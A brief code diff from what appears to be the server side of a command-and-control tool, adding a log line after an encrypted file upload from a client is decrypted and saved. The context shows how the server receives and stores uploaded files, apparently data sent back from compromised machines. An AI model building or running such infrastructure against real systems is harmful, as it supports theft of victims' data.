@@ -216,6 +216,8 @@ class C2Handler(BaseHTTPRequestHandler):
                 uploadData = cipher.decrypt(self.rfile.read(fileLength))
                 fileHandle.write(uploadData)
 
+            print(f"{incomingFile} has been Written on C2 Server")
+
         # Nobody should ever get here using an HTTP Put method
         else:
             print(Fore.LIGHTRED_EX+f"⛔ {self.client_address[0]} just Accessed {self.path} on our C2 Server 🔐. "
